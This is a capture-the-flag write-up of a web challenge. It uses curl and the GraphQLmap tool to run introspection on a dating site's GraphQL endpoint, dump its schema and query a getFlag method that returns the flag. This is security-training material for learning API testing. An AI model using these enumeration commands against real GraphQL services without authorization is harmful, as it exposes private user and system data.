# Find my intro
Category: Web, 100 points

## Description

> challenge 1 in Imperva's GQLDating series
> 
> Hi there! I just joined a new dating site called GQL-Dating and I'm so excited :) I hope to find my life partner.. But first, can you please help me inject the schema?


## Solution

The attached website is an online dating website which allows registering and searching for other users. While searching for a user, we can see the following request being sent from the site:

```console
┌──(user@kali)-[/media/sf_CTFs/technion/Find_my_intro]
└─$ curl 'http://ec2-3-239-182-16.compute-1.amazonaws.com:1234/gql/graphql' -X POST -H 'Content-Type: application/json' --data-raw '{"operationName":null,"variables":{},"query":"query {   getPersonByName(name:\"test\"){     persons{       id       name     gender     link}   } }"}'
{"data":{"getPersonByName":{"persons":[]}}}
```

This is a [GraphQL](https://en.wikipedia.org/wiki/GraphQL) query. Let's see how we can use it to leak data from the DB. We'll use [GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) to interact with the GraphQL endpoint. First, let's dump the schema:

```console
┌──(user@kali)-[/media/sf_CTFs/technion/Find_my_intro]
└─$ python3 ~/utils/web/GraphQLmap/graphqlmap.py -u http://ec2-3-239-182-16.compute-1.amazonaws.com:1234/gql/graphql?query={} -v --method POST --json
   _____                 _      ____  _
  / ____|               | |    / __ \| |
 | |  __ _ __ __ _ _ __ | |__ | |  | | |     _ __ ___   __ _ _ __
 | | |_ | '__/ _` | '_ \| '_ \| |  | | |    | '_ ` _ \ / _` | '_ \
 | |__| | | | (_| | |_) | | | | |__| | |____| | | | | | (_| | |_) |
  \_____|_|  \__,_| .__/|_| |_|\___\_\______|_| |_| |_|\__,_| .__/
                  | |                                       | |
                  |_|                                       |_|
                              Author: @pentest_swissky Version: 1.0
GraphQLmap > dump_new
============= [SCHEMA] ===============
e.g: name[Type]: arg (Type!)

User
        name[]:
        email[]:
        rate[]:
Flag
        hint[]:
        key[]:
FlagResult
        success[Boolean]:
        errors[String]:
        flag[]:
Person
        id[ID]:
        nickname[]:
        name[]:
        last_name[]:
        joined_at[]:
        city[]:
        interest_in[]:
        gender[]:
        personal_info[]:
        link[]:
PersonRate
        id[ID]:
        nickname[]:
        name[]:
        last_name[]:
        rate[]:
PersonResult
        success[Boolean]:
        errors[String]:
        person[]:
PersonsResult
        success[Boolean]:
        errors[String]:
        persons[Person]:
PersonRateResult
        success[Boolean]:
        errors[String]:
        person_rate[]:
UserResult
        success[Boolean]:
        errors[String]:
        user[]:
Post
        id[ID]:
        title[String]:
        description[String]:
        created_at[String]:
PostResult
        success[Boolean]:
        errors[String]:
        post[]:
PostsResult
        success[Boolean]:
        errors[String]:
        posts[Post]:
Query
        getFlag[FlagResult]:
        listPosts[PostsResult]:
        getPost[PostResult]: id (ID!),
        listPersons[PersonsResult]:
        getPerson[PersonResult]: id (ID!),
        getPersonByName[PersonsResult]: name (!),
        getPersonByNickName[PersonResult]: nickname (!),
        getPersonRate[PersonRateResult]: id (ID!),
        getUser[UserResult]: email (String!),
Mutation
        createPost[PostResult]: title (String!), description (String!), created_at (!),
        updatePost[PostResult]: id (ID!), title (!), description (!),
        deletePost[PostResult]: id (!),
        updatePersonRate[PersonRateResult]: id (ID!), rate (Int!),
        updateUserRate[UserResult]: email (String!), rate (Int!),
__Schema
__Type
__Field
__InputValue
__EnumValue
__Directive
GraphQLmap >
```


This gives us a nice overview of the methods and objects. We can see that there's a method (Query) called `getFlag`, which returns a `FlagResult` containing a `flag` with a `hint` and a `key`. Let's get it:

```console
GraphQLmap > { getFlag { flag {hint key}}}
{ getFlag { flag {hint key}}}
{
    "data": {
        "getFlag": {
            "flag": {
                "hint": "I really like the nickname liron",
                "key": "cstechnion{b00m!_600d_574r7_}"
            }
        }
    }
}
```